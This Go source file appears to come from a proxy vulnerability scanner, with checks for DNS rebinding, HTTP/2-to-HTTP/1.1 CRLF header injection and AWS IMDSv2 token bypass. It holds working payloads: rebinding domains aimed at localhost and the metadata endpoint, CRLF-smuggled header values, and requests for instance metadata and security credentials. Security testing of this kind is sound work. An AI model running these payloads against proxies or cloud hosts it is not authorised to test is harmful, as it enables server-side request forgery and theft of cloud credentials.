package proxy

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"golang.org/x/net/http2"
)

// testDNSRebinding tests for DNS rebinding vulnerabilities
// Uses public DNS rebinding services that actually change their resolution
func (c *Checker) testDNSRebinding(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[DNS REBINDING] Testing DNS rebinding vulnerabilities\n"
	}

	vulnerable := false
	rebindDetails := []string{}

	// Check if Interactsh-based tests are disabled
	if c.config.AdvancedChecks.DisableInteractsh {
		if c.debug {
			result.DebugInfo += "  [SKIP] Interactsh disabled, using public DNS rebinding services\n"
		}
	}

	// DNS Rebinding attack scenarios using public services
	// These domains use DNS tricks to first resolve to a public IP, then to internal IPs
	rebindingTests := []struct {
		domain      string
		description string
	}{
		{
			domain:      "make-127-0-0-1-rr.1u.ms",
			description: "DNS rebinding to 127.0.0.1 via 1u.ms",
		},
		{
			domain:      "7f000001.rbndr.us",
			description: "DNS rebinding to 127.0.0.1 via rbndr.us",
		},
		{
			domain:      "make-169-254-169-254-rr.1u.ms",
			description: "DNS rebinding to 169.254.169.254 (AWS metadata)",
		},
	}

	for _, test := range rebindingTests {
		if c.debug {
			result.DebugInfo += fmt.Sprintf("  Testing: %s\n", test.description)
		}

		// First request - should succeed (resolves to public IP)
		testURL := fmt.Sprintf("http://%s/", test.domain)
		req1, err := http.NewRequest("GET", testURL, nil)
		if err != nil {
			continue
		}

		ctx1, cancel1 := context.WithTimeout(context.Background(), 5*time.Second)
		req1 = req1.WithContext(ctx1)

		resp1, err1 := client.Do(req1)
		cancel1()

		if err1 == nil {
			resp1.Body.Close()

			// Wait for DNS cache to refresh (short TTL on rebinding domains)
			time.Sleep(2 * time.Second)

			// Second request - might resolve to internal IP
			req2, err := http.NewRequest("GET", testURL, nil)
			if err != nil {
				continue
			}

			ctx2, cancel2 := context.WithTimeout(context.Background(), 5*time.Second)
			req2 = req2.WithContext(ctx2)

			resp2, err2 := client.Do(req2)
			cancel2()

			if err2 == nil {
				defer resp2.Body.Close()
				body, _ := io.ReadAll(resp2.Body)
				bodyStr := string(body)

				// Check if second request reached internal service
				if strings.Contains(bodyStr, "ami-id") ||
					strings.Contains(bodyStr, "instance-id") ||
					strings.Contains(bodyStr, "metadata") ||
					(resp2.StatusCode == 200 && len(bodyStr) > 0 && strings.Contains(test.domain, "169-254")) {

					vulnerable = true
					rebindDetails = append(rebindDetails, test.description)

					if c.debug {
						result.DebugInfo += fmt.Sprintf("  [VULN] DNS rebinding successful: %s\n", test.description)
					}
				}
			} else {
				// Connection error on second request might indicate attempt to connect to internal IP
				if strings.Contains(err2.Error(), "connection refused") ||
					strings.Contains(err2.Error(), "no route to host") {

					vulnerable = true
					rebindDetails = append(rebindDetails, fmt.Sprintf("%s (connection attempt detected)", test.description))

					if c.debug {
						result.DebugInfo += fmt.Sprintf("  [VULN] DNS rebinding connection attempt: %s\n", test.description)
					}
				}
			}
		}
	}

	return vulnerable, rebindDetails
}

// testHTTP2HeaderInjection tests for HTTP/2 header injection vulnerabilities
// HTTP/2 uses binary framing, so CRLF validation is often skipped
// When downgraded to HTTP/1.1, injected CRLF can smuggle headers/requests
func (c *Checker) testHTTP2HeaderInjection(result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[HTTP/2 HEADER INJECTION] Testing HTTP/2 to HTTP/1.1 downgrade CRLF injection\n"
	}

	vulnerable := false
	injectedHeaders := []string{}

	// Get proxy URL
	proxyURL := result.Proxy
	if proxyURL == "" {
		return false, nil
	}

	// Parse proxy URL
	targetHost := strings.TrimPrefix(proxyURL, "http://")
	targetHost = strings.TrimPrefix(targetHost, "https://")
	if idx := strings.Index(targetHost, "/"); idx != -1 {
		targetHost = targetHost[:idx]
	}

	// Determine if we should use TLS
	useTLS := strings.HasPrefix(proxyURL, "https://")

	// Test cases with CRLF injection in HTTP/2 headers
	testCases := []struct {
		header      string
		value       string
		description string
	}{
		{
			header:      "X-Forwarded-Host",
			value:       "169.254.169.254\r\nX-Injected: true",
			description: "CRLF in X-Forwarded-Host",
		},
		{
			header:      "X-Original-URL",
			value:       "/admin\r\nHost: 169.254.169.254",
			description: "Host header injection via X-Original-URL",
		},
		{
			header:      "X-Custom-Header",
			value:       "test\r\nGET /admin HTTP/1.1\r\nHost: internal",
			description: "Request smuggling via CRLF",
		},
		{
			header:      "Referer",
			value:       "http://example.com\r\nX-Forwarded-For: 127.0.0.1",
			description: "Header injection in Referer",
		},
	}

	for _, tc := range testCases {
		if c.debug {
			result.DebugInfo += fmt.Sprintf("  Testing: %s\n", tc.description)
		}

		// Create HTTP/2 client
		var transport *http2.Transport
		if useTLS {
			transport = &http2.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			}
		} else {
			// HTTP/2 cleartext (h2c)
			transport = &http2.Transport{
				AllowHTTP: true,
				DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
					return net.Dial(network, addr)
				},
			}
		}

		client := &http.Client{
			Transport: transport,
			Timeout:   10 * time.Second,
		}

		// Build test URL
		scheme := "http"
		if useTLS {
			scheme = "https"
		}
		testURL := fmt.Sprintf("%s://%s/", scheme, targetHost)

		req, err := http.NewRequest("GET", testURL, nil)
		if err != nil {
			continue
		}

		// Inject CRLF in header value
		// In HTTP/2, these are sent in binary HPACK format without CRLF validation
		// On downgrade to HTTP/1.1, the CRLF becomes meaningful
		req.Header.Set(tc.header, tc.value)

		// Attempt request
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		req = req.WithContext(ctx)

		resp, err := client.Do(req)
		if err != nil {
			// Connection errors might indicate injection succeeded and broke parsing
			if strings.Contains(err.Error(), "malformed") ||
				strings.Contains(err.Error(), "invalid") {
				vulnerable = true
				injectedHeaders = append(injectedHeaders, tc.description)

				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] HTTP/2 header injection: %s\n", tc.description)
				}
			}
			continue
		}
		defer resp.Body.Close()

		// Read response
		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)

		// Check for evidence of successful injection
		// If we see our injected headers reflected or behavior changes
		if strings.Contains(bodyStr, "X-Injected: true") ||
			strings.Contains(bodyStr, "ami-id") ||
			strings.Contains(bodyStr, "metadata") ||
			resp.StatusCode == 200 && strings.Contains(tc.value, "admin") {

			vulnerable = true
			injectedHeaders = append(injectedHeaders, tc.description)

			if c.debug {
				result.DebugInfo += fmt.Sprintf("  [VULN] HTTP/2 header injection successful: %s\n", tc.description)
			}
		}
	}

	return vulnerable, injectedHeaders
}

// testIMDSv2Bypass tests for AWS IMDSv2 token workflow bypass vulnerabilities
// IMDSv2 requires: PUT request to get session token, then use token in X-aws-ec2-metadata-token header
// Tests if proxy properly handles this two-step workflow or if it can be bypassed
func (c *Checker) testIMDSv2Bypass(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[IMDSv2 BYPASS] Testing AWS IMDSv2 token workflow\n"
	}

	vulnerable := false
	imdsDetails := []string{}

	// IMDSv2 endpoint
	imdsv2Endpoint := "http://169.254.169.254/latest/api/token"
	metadataEndpoint := "http://169.254.169.254/latest/meta-data/"

	// Step 1: Try to get IMDSv2 session token
	// PUT /latest/api/token with X-aws-ec2-metadata-token-ttl-seconds header
	if c.debug {
		result.DebugInfo += "  Step 1: Requesting IMDSv2 session token\n"
	}

	tokenReq, err := http.NewRequest("PUT", imdsv2Endpoint, nil)
	if err != nil {
		return false, nil
	}

	// IMDSv2 requires this header to specify token TTL
	tokenReq.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	tokenReq = tokenReq.WithContext(ctx)

	tokenResp, err := client.Do(tokenReq)
	var sessionToken string

	if err == nil {
		defer tokenResp.Body.Close()
		if tokenResp.StatusCode == 200 {
			tokenBytes, _ := io.ReadAll(tokenResp.Body)
			sessionToken = string(tokenBytes)

			if c.debug {
				result.DebugInfo += fmt.Sprintf("  [INFO] Obtained IMDSv2 token (length: %d)\n", len(sessionToken))
			}
		}
	}

	// Step 2: Try to access metadata using the token
	if sessionToken != "" {
		if c.debug {
			result.DebugInfo += "  Step 2: Accessing metadata with IMDSv2 token\n"
		}

		metadataReq, err := http.NewRequest("GET", metadataEndpoint, nil)
		if err == nil {
			// Add the session token header required by IMDSv2
			metadataReq.Header.Set("X-aws-ec2-metadata-token", sessionToken)

			ctx2, cancel2 := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel2()
			metadataReq = metadataReq.WithContext(ctx2)

			metadataResp, err := client.Do(metadataReq)
			if err == nil {
				defer metadataResp.Body.Close()
				body, _ := io.ReadAll(metadataResp.Body)
				bodyStr := string(body)

				if metadataResp.StatusCode == 200 && (strings.Contains(bodyStr, "ami-id") ||
					strings.Contains(bodyStr, "instance-id") ||
					strings.Contains(bodyStr, "security-credentials")) {

					vulnerable = true
					imdsDetails = append(imdsDetails, "IMDSv2 token workflow bypass - full access to metadata service")

					if c.debug {
						result.DebugInfo += "  [VULN] IMDSv2 bypass successful - accessed metadata with token\n"
					}
				}
			}
		}
	}

	// Step 3: Try IMDSv1 fallback (should be blocked if IMDSv2 is enforced)
	if c.debug {
		result.DebugInfo += "  Step 3: Testing IMDSv1 fallback (should be blocked)\n"
	}

	fallbackReq, err := http.NewRequest("GET", metadataEndpoint, nil)
	if err == nil {
		ctx3, cancel3 := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel3()
		fallbackReq = fallbackReq.WithContext(ctx3)

		fallbackResp, err := client.Do(fallbackReq)
		if err == nil {
			defer fallbackResp.Body.Close()
			body, _ := io.ReadAll(fallbackResp.Body)
			bodyStr := string(body)

			// If IMDSv1 (no token) works, it's a vulnerability
			if fallbackResp.StatusCode == 200 && (strings.Contains(bodyStr, "ami-id") ||
				strings.Contains(bodyStr, "instance-id")) {

				vulnerable = true
				imdsDetails = append(imdsDetails, "IMDSv1 fallback allowed - IMDSv2 enforcement bypassed")

				if c.debug {
					result.DebugInfo += "  [VULN] IMDSv1 fallback works - IMDSv2 not enforced\n"
				}
			}
		}
	}

	// Step 4: Test token manipulation attempts
	if c.debug {
		result.DebugInfo += "  Step 4: Testing token manipulation\n"
	}

	manipulationTests := []struct {
		description string
		token       string
	}{
		{
			description: "Empty token",
			token:       "",
		},
		{
			description: "Invalid token",
			token:       "AAAAAAAAAAAAAAAAAAAA",
		},
		{
			description: "Token with CRLF injection",
			token:       "token\r\nX-Forwarded-For: 169.254.169.254",
		},
	}

	for _, test := range manipulationTests {
		manipReq, err := http.NewRequest("GET", metadataEndpoint, nil)
		if err != nil {
			continue
		}

		if test.token != "" {
			manipReq.Header.Set("X-aws-ec2-metadata-token", test.token)
		}

		ctx4, cancel4 := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel4()
		manipReq = manipReq.WithContext(ctx4)

		manipResp, err := client.Do(manipReq)
		if err == nil {
			defer manipResp.Body.Close()
			body, _ := io.ReadAll(manipResp.Body)
			bodyStr := string(body)

			if manipResp.StatusCode == 200 && (strings.Contains(bodyStr, "ami-id") ||
				strings.Contains(bodyStr, "instance-id")) {

				vulnerable = true
				imdsDetails = append(imdsDetails, fmt.Sprintf("Token manipulation bypass: %s", test.description))

				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Token manipulation successful: %s\n", test.description)
				}
			}
		}
	}

	return vulnerable, imdsDetails
}
